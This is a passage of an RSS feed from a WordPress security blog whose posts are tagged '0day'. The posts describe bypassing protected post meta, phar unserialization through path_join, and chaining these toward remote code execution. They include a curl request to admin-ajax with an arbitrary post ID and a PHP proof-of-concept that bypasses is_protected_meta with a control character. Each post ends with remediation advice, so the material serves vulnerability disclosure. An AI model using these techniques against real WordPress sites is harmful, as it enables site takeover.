		<guid isPermaLink="false">https://wpdeeply.com/?p=25</guid>

					<description><![CDATA[Adding slashes or removing them is a thing on WP. Most of the meta functions perform that e.g. they hold that not popular&#160;wp_unslashagainst meta keys and values. This means when input towards&#160;update_metadata&#160;and&#160;add_metadata&#160;isn’t from the current http requst via some web form e.g. html interface there is possibility for user to insert/update protected meta key into &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-protected-meta-via-wp-job-manager/"> <span class="screen-reader-text">WordPress protected meta via wp job manager</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>Adding slashes or removing them is a thing on WP. Most of the meta functions perform that e.g. they hold that not popular&nbsp;<code>wp_unslash</code>against meta keys and values. This means when input towards&nbsp;<code>update_metadata</code>&nbsp;and&nbsp;<code>add_metadata</code>&nbsp;isn’t from the current http requst via some web form e.g. html interface there is possibility for user to insert/update protected meta key into post meta database table with simple&nbsp;<code>\_any-value</code>&nbsp;meta key format.</p>



<h2>Eli5 PoC</h2>



<p>WP Job Manager holds functionality that duplicates Job Post and that is avaliable only via Job Dashboard. That is possible via&nbsp;<code>job_manager_duplicate_listing</code>&nbsp;function and there we have the&nbsp;<code>update_post_meta</code>&nbsp;call.</p>



<pre class="wp-block-code"><code lang="php" class="language-php">...
	// phpcs:ignore WordPress.DB.DirectDatabaseQuery.DirectQuery, WordPress.DB.DirectDatabaseQuery.NoCaching -- Easiest way to retrieve raw meta values without filters.
	$post_meta = $wpdb->get_results( $wpdb->prepare( "SELECT meta_key, meta_value FROM {$wpdb->postmeta} WHERE post_id=%d", $post_id ) );

	if ( ! empty( $post_meta ) ) {
		$post_meta = wp_list_pluck( $post_meta, 'meta_value', 'meta_key' );

		$default_duplicate_ignore_keys = [ '_filled', '_featured', '_job_expires', '_job_duration', '_package_id', '_user_package_id' ];
		$duplicate_ignore_keys         = apply_filters( 'job_manager_duplicate_listing_ignore_keys', $default_duplicate_ignore_keys, true );

		foreach ( $post_meta as $meta_key => $meta_value ) {
			if ( in_array( $meta_key, $duplicate_ignore_keys, true ) ) {
				continue;
			}
			update_post_meta( $new_post_id, $meta_key, maybe_unserialize( $meta_value ) );
		}
	}
...
</code></pre>



<p>Everything is fine, but we must have the possibility to insert meta / custom fields into job post. If we check deeply this functionality then this&nbsp;<code>job_manager_duplicate_listing</code>&nbsp;is called in&nbsp;<code>job_dashboard_handler</code>&nbsp;which is&nbsp;<code>WP_Job_Manager_Shortcodes</code>&nbsp;method. Checking its functionlity we have the following:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">public function job_dashboard_handler() {
	if (
		! empty( $_REQUEST['action'] )
		&amp;&amp; ! empty( $_REQUEST['_wpnonce'] )
		&amp;&amp; wp_verify_nonce( wp_unslash( $_REQUEST['_wpnonce'] ), 'job_manager_my_job_actions' ) // phpcs:ignore WordPress.Security.ValidatedSanitizedInput.InputNotSanitized -- Nonce should not be modified.
	) {

		$action = sanitize_title( wp_unslash( $_REQUEST['action'] ) );
		$job_id = isset( $_REQUEST['job_id'] ) ? absint( $_REQUEST['job_id'] ) : 0;

		try {
			// Get Job.
			$job = get_post( $job_id );

			// Check ownership.
			if ( ! job_manager_user_can_edit_job( $job_id ) ) {
				throw new Exception( __( 'Invalid ID', 'wp-job-manager' ) );
			}

			switch ( $action ) {
...
case 'duplicate':
						if ( ! job_manager_get_permalink( 'submit_job_form' ) ) {
							throw new Exception( __( 'Missing submission page.', 'wp-job-manager' ) );
						}

						$new_job_id = job_manager_duplicate_listing( $job_id );

</code></pre>



<p>From here we see that&nbsp;<code>_wpnonce</code>&nbsp;isn’t tight up with job id, but also from&nbsp;<code>job_manager_user_can_edit_job</code>&nbsp;we see that post type isn’t checked, but only capability for user to edit the post and that could be any post from any post type. Having in mind previous knowledge presented on wpdeeply and nature of WordPress, this could be considered as high severity issue. Check the facts for RCE <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h2>Few facts</h2>



<ul><li>WP Job Manager <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/" target="_blank">isn’t alone</a> and can be attacked via core</li><li>What about WooCommerce before 4.1.0 or <a href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/" target="_blank" rel="noreferrer noopener">latest WooCommerce</a></li><li>Accessing the blocked meta keys in&nbsp;<code>job_manager_duplicate_listing</code>&nbsp;via this <a href="https://wpdeeply.com/wordpress-core-and-mysql-string-comparison/" target="_blank" rel="noreferrer noopener">technique</a></li></ul>



<h2>Remediation</h2>



<ul><li>Calling&nbsp;<code>wp_slash</code>&nbsp;on input won’t solve the issue, because <code>update_metadata</code></li><li>:/</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress attachment api functions and any post type</title>
		<link>https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Sun, 09 Aug 2020 20:09:17 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<category><![CDATA[plugins]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=27</guid>

					<description><![CDATA[Core had put some efforts in order to prevent accessing&#160;attachment&#160;post type functions from another post types. Usually checks are done by calling&#160;get_post&#160;and comparing the post type with&#160;attachment, but that is selective and only in hand picked places. It is that way because performances mainly, so many functions are lacking this checks. Eli5 PoC One of &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/"> <span class="screen-reader-text">WordPress attachment api functions and any post type</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>Core had put some efforts in order to prevent accessing&nbsp;<code>attachment</code>&nbsp;post type functions from another post types. Usually checks are done by calling&nbsp;<code>get_post</code>&nbsp;and comparing the post type with&nbsp;<code>attachment</code>, but that is selective and only in hand picked places. It is that way because performances mainly, so many functions are lacking this checks.</p>



<h2>Eli5 PoC</h2>



<p>One of them, that calls another attachment related is&nbsp;<code>wp_update_image_subsizes</code>&nbsp;and there we have the following calls up to&nbsp;<code>path_join</code>where we have <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-and-phar-unserialize/" target="_blank">phar unserialize</a> or&nbsp;<code>wp_create_image_subsizes</code>&nbsp;where <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/" target="_blank">image editor RCE ?!</a> is in game, but also&nbsp;<code>getimagesize</code>&nbsp;as phar unserialize appears too.</p>



<ul><li><code>wp_update_image_subsizes</code><ul><li><code>wp_get_attachment_metadata</code></li><li><code>wp_get_original_image_path</code><ul><li><code>wp_attachment_is_image</code></li><li><code>wp_get_attachment_metadata</code></li><li><code>get_attached_file</code></li><li><code>path_join</code></li></ul></li></ul></li></ul>



<p>this function is called in&nbsp;<code>wp_ajax_media_create_image_subsizes</code></p>



<pre class="wp-block-code"><code lang="php" class="language-php">function wp_ajax_media_create_image_subsizes() {
	check_ajax_referer( 'media-form' );

	if ( ! current_user_can( 'upload_files' ) ) {
		wp_send_json_error( array( 'message' => __( 'Sorry, you are not allowed to upload files.' ) ) );
	}

	if ( empty( $_POST['attachment_id'] ) ) {
		wp_send_json_error( array( 'message' => __( 'Upload failed. Please reload and try again.' ) ) );
	}

	$attachment_id = (int) $_POST['attachment_id'];

	if ( ! empty( $_POST['_wp_upload_failed_cleanup'] ) ) {
		// Upload failed. Cleanup.
		if ( wp_attachment_is_image( $attachment_id ) &amp;&amp; current_user_can( 'delete_post', $attachment_id ) ) {
			$attachment = get_post( $attachment_id );

			// Created at most 10 min ago.
			if ( $attachment &amp;&amp; ( time() - strtotime( $attachment->post_date_gmt ) &lt; 600 ) ) {
				wp_delete_attachment( $attachment_id, true );
				wp_send_json_success();
			}
		}
	}

	// Set a custom header with the attachment_id.
	// Used by the browser/client to resume creating image sub-sizes after a PHP fatal error.
	if ( ! headers_sent() ) {
		header( 'X-WP-Upload-Attachment-ID: ' . $attachment_id );
	}

	// This can still be pretty slow and cause timeout or out of memory errors.
	// The js that handles the response would need to also handle HTTP 500 errors.
	wp_update_image_subsizes( $attachment_id );
...
</code></pre>



<p>where&nbsp;<code>attachment_id</code>&nbsp;could be any post&nbsp;<code>ID</code>&nbsp;from any&nbsp;<code>post_type</code>. So if&nbsp;<code>author</code>&nbsp;user role grabs the&nbsp;<code>_wpnonce</code>&nbsp;from&nbsp;<code>wp-admin/media-new.php</code>&nbsp;could perform the request below with “attacking” post ID.</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">curl 'http://local.target/wp-admin/admin-ajax.php' -H 'Cookie: ...' --data 'action=media-create-image-subsizes&amp;_ajax_nonce=[media-form-nonce]&amp;attachment_id=[any-post-id-with-protected-atachment-meta]' --compressed
</code></pre>



<p>How to add protected meta into posts?! Check the facts below. <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h2>Few facts</h2>



<ul><li>Yoast Duplicate posts is <a href="https://plugins.trac.wordpress.org/browser/duplicate-post/trunk/duplicate-post-admin.php#L637" target="_blank" rel="noreferrer noopener">adding protected</a> meta when cloning if meta / custom field key starts with&nbsp;<code>\_</code></li><li>We had already seen the <a href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/" target="_blank" rel="noreferrer noopener">wordpress-importer in action</a></li><li>WooCommerce had fixed something similar <a rel="noreferrer noopener" href="https://raw.githubusercontent.com/woocommerce/woocommerce/master/CHANGELOG.txt" target="_blank">few months</a> ago in 4.1.0 version</li></ul>



<h2>Remediation</h2>



<ul><li>make sure that&nbsp;<code>attachment</code>&nbsp;routines are performed only over attachments</li><li>do not allow users to create protected meta</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress and phar unserialize</title>
		<link>https://wpdeeply.com/wordpress-and-phar-unserialize/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Fri, 07 Aug 2020 20:41:00 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=43</guid>

					<description><![CDATA[Core team had put some effort into project in order to preven unserialize of user input via&#160;phar&#160;stream wrapper. In general, efforts are good, but to excelent there are two more grades and this is the max with this approach. In the core there is function&#160;path_join&#160;that accepts two parameters&#160;$base&#160;and&#160;$path.&#160;$path&#160;is then sent towards function&#160;path_is_absolute&#160;and from the code &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-and-phar-unserialize/"> <span class="screen-reader-text">WordPress and phar unserialize</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>Core team had put some effort into project in order to preven unserialize of user input via&nbsp;<code>phar</code>&nbsp;stream wrapper. In general, efforts are good, but to excelent there are two more grades and this is the max with this approach. In the core there is function&nbsp;<code>path_join</code>&nbsp;that accepts two parameters&nbsp;<code>$base</code>&nbsp;and&nbsp;<code>$path</code>.&nbsp;<code>$path</code>&nbsp;is then sent towards function&nbsp;<code>path_is_absolute</code>&nbsp;and from the code</p>



<pre class="wp-block-code"><code lang="php" class="language-php">function path_is_absolute( $path ) {
	/*
	 * Check to see if the path is a stream and check to see if its an actual
	 * path or file as realpath() does not support stream wrappers.
	 */
	if ( wp_is_stream( $path ) &amp;&amp; ( is_dir( $path ) || is_file( $path ) ) ) {
		return true;
	}
...
</code></pre>



<p>it is obvious that&nbsp;<code>wp_is_stream</code>&nbsp;will return&nbsp;<code>TRUE</code>&nbsp;for&nbsp;<code>phar://path_here</code>&nbsp;and will reach&nbsp;<code>is_dir</code>&nbsp;and/or&nbsp;<code>is_file</code>&nbsp;which will trigger unserialize of user input in WP.</p>



<h2>Eli5 PoC</h2>



<p>In&nbsp;<code>wp_restore_image</code>&nbsp;function which could be called by any user with upload rights on WP (author user role by default) there is the following flow:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">...
$backup_sizes     = get_post_meta( $post_id, '_wp_attachment_backup_sizes', true );
...
if ( isset( $backup_sizes['full-orig'] ) &amp;&amp; is_array( $backup_sizes['full-orig'] ) ) {
		$data = $backup_sizes['full-orig'];
...
		$restored_file = path_join( $parts['dirname'], $data['file'] );
		$restored      = update_attached_file( $post_id, $restored_file );

</code></pre>



<p>There it is, unserialize of user input. How to place custom values in&nbsp;<code>_wp_attachment_backup_sizes</code>, check the facts <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h2>Few facts</h2>



<ul><li><code>import</code>&nbsp;capability is <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/" target="_blank">fatal</a> for WP because arbitrary post create from low permission user roles</li><li>this is how to meddle with <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-attached-file-meta/" target="_blank">attached file</a> via <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-importer-and-attached-file/" target="_blank">importer</a></li><li><code>path_join</code>&nbsp;is wide spread across <a rel="noreferrer noopener" href="https://wpdirectory.net/search/01EF5E56NN5S9VHK7BMQ9XF3BZ" target="_blank">eco system</a></li><li>no need for <a href="https://wpdeeply.com/wordpress-upload-any-file-with-image-extension/" target="_blank" rel="noreferrer noopener">image polyglots</a></li></ul>



<h1>Remediation</h1>



<ul><li>phar vulnerabilities should be handled on <a href="https://github.com/TYPO3/phar-stream-wrapper" target="_blank" rel="noreferrer noopener">stream wrapper level</a>, not with “guarding”</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress and multiple maybe_unserialize</title>
		<link>https://wpdeeply.com/wordpress-and-multiple-maybe_unserialize/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Mon, 27 Jul 2020 20:12:00 +0000</pubDate>
				<category><![CDATA[plugins]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=29</guid>

					<description><![CDATA[WordPress introduced&#160;maybe_unserialize&#160;and&#160;maybe_serialize&#160;as security functions in the past and they are deeply integrated in the core. Usually for backward compatibility or improper usage in the past, many software vendors are using multiple&#160;maybe_unserialize towards values that could be planted into DB with lower number of&#160;maybe_serializecalls. Eli5 PoC and if you think that this code isn’t existing then &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-and-multiple-maybe_unserialize/"> <span class="screen-reader-text">WordPress and multiple maybe_unserialize</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>WordPress introduced&nbsp;<code>maybe_unserialize</code>&nbsp;and&nbsp;<code>maybe_serialize</code>&nbsp;as security functions in the past and they are deeply integrated in the core. Usually for backward compatibility or improper usage in the past, many software vendors are using multiple&nbsp;<code>maybe_unserialize</code> towards values that could be planted into DB with lower number of&nbsp;<code>maybe_serialize</code>calls.</p>



<h2>Eli5 PoC</h2>



<pre class="wp-block-code"><code lang="php" class="language-php">$maybe_double_unserialize = function ( $value ) {
	return maybe_unserialize( $value );
};

$values = array_map(
	$maybe_double_unserialize,
	array_filter( get_post_meta( $product_id, $field_key ) )
);
</code></pre>



<p>and if you think that this code isn’t existing then <a rel="noreferrer noopener" href="https://plugins.trac.wordpress.org/browser/woocommerce-multilingual/trunk/inc/translation-editor/class-wcml-editor-ui-product-job.php#L984" target="_blank">check this</a> out. Yes it is 100k active installs Woo plugin and when Woo unserialze attack is in question, <a rel="noreferrer noopener" href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/" target="_blank">then</a>! :/</p>



<h2>Few facts</h2>



<ul><li>double&nbsp;<code>maybe_unserialize</code>&nbsp;is quite widespread around WP eco system, specially in Woo related plugins</li></ul>



<h2>Remediation</h2>



<ul><li>add constraints into your php.ini regarding serialization</li><li>mod the maybe_ functions so they sign the final payload</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress core and MySQL string comparison</title>
		<link>https://wpdeeply.com/wordpress-core-and-mysql-string-comparison/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Sat, 25 Jul 2020 20:16:00 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<category><![CDATA[plugins]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=31</guid>

					<description><![CDATA[If we execute the following MySQL query against WP database we will get results in case we had already uploaded media in the past This is sort of “feature” of MySQL RDBMS, but what this means from WP aspect. It means a lot, because in the past there were account take over / backdoor vulnerabilities &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-core-and-mysql-string-comparison/"> <span class="screen-reader-text">WordPress core and MySQL string comparison</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>If we execute the following MySQL query against WP database</p>



<pre class="wp-block-code"><code lang="php" class="language-php">select * from wp_postmeta where meta_key = concat(char(1),"_wp_attached_file");
</code></pre>



<p>we will get results in case we had already uploaded media in the past</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">+---------+---------+-------------------+--------------------------------+
| meta_id | post_id | meta_key          | meta_value                     |
+---------+---------+-------------------+--------------------------------+
|      46 |      92 | _wp_attached_file | 2020/07/wpdeeply.png#/boom.png |
|      71 |      99 | _wp_attached_file | wpdeeply                       |
+---------+---------+-------------------+--------------------------------+
2 rows in set (0.00 sec)

</code></pre>



<p>This is sort of “feature” of MySQL RDBMS, but what this means from WP aspect. It means a lot, because in the past there were account take over / backdoor vulnerabilities fixed silently and today we are going to focus on&nbsp;<code>update_metadata</code>&nbsp;function. WordPress prevents medling with protected meta via&nbsp;<code>is_protected_meta</code>&nbsp;function which basically checks if&nbsp;<code>meta_key</code>&nbsp;starts with&nbsp;<code>_</code>, but that isn’t enough because it is on PHP side.</p>



<p>Eli5 PoC</p>



<p>Upload media file on your test WP instance and grab the&nbsp;<code>post_id</code>. Then run the following code snippet with your own data / post_id:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">function bypass_protected_meta(){
    //your demo media(post) id
    $post_id = 99;
    
    $meta_key = "\x11_wp_attached_file";
    $meta_value = "wpdeeply";
    
    //into edit post meta capability there is check for protected meta, but this is for auditorium to be much more clearer 
    if ( current_user_can( 'edit_post_meta', $post_id, $meta_key ) &amp;&amp; ! is_protected_meta($meta_key) ){
        update_post_meta($post_id, $meta_key, $meta_value);
    }
}

add_action(init, "bypass_protected_meta");
</code></pre>



<p>Refresh the media (will not be displayed) and if you check in DB&nbsp;<code>_wp_attached_file</code>&nbsp;will have the&nbsp;<code>wpdeeply</code>&nbsp;value. Is this bug with impact? Well Jetpack folks will need to answer that&nbsp;<a href="https://github.com/Automattic/jetpack/blob/master/json-endpoints/class.wpcom-json-api-update-post-v1-2-endpoint.php#L824">https://github.com/Automattic/jetpack/blob/master/json-endpoints/class.wpcom-json-api-update-post-v1-2-endpoint.php#L824</a>, but you can find a lot of use cases on wpdirectory <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h2>Few facts</h2>



<ul><li>This MySQL behaviour is for huge set of utf-8 characters not only ascii control ones</li><li>Why this <a rel="noreferrer noopener" href="https://stackoverflow.com/questions/543580/equals-vs-like/2336940#2336940" target="_blank">happens</a>&nbsp;</li><li>There are more places around WP code where unexpected behaviour is in game, because at the end of the day WP is just PHP &amp; MySQL web app</li><li>Meddling with protected meta on WP is RCE. Few examples: <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/" target="_blank">here</a>, <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank">here</a> and <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank">here</a>. There are few not disclosed too <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li></ul>



<h2>Remediation</h2>



<ul><li>be careful with data used in MySQL WHERE</li><li><code>is_protected_meta</code>&nbsp;should be DB/MySQL check against current setup instead PHP one</li></ul>
]]></content:encoded>
					
		
		
			</item>
	</channel>
</rss>
